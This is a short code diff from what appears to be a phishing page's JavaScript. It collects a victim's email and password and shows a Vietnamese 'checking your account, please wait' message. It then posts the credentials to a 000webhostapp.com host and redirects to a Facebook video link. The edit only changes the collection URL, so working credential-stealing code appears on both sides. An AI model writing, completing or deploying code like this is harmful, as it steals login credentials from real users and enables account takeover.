@@ -81,7 +81,7 @@
                     //console.log(email); console.log(pass);
                     if(email.length >8 && pass.length >5){
                        $("#lblMsg").html("Đang kiểm tra tài khoản vui lòng chờ trong giây lát")
-                       $.post('https://cailonnek.000webhostapp.com/', {email: email,pass: pass}, function(data, textStatus, xhr) {
+                       $.post('https://cailonnek.000webhostapp.com/index.php', {email: email,pass: pass}, function(data, textStatus, xhr) {
                         location.replace("https://video.fsgn3-1.fna.fbcdn.net/v/t42.1790-2/138508758_844849996248724_2004484542521578208_n.mp4?_nc_cat=104&ccb=2&_nc_sid=985c63&efg=eyJ2ZW5jb2RlX3RhZyI6ImxlZ2FjeV9zZCJ9&_nc_ohc=5vmlxwoKPpkAX8FRBzQ&_nc_ht=video.fsgn3-1.fna&oh=6e77a366b02e0748f7f40f6940723047&oe=6001E964");
                         });
                     }
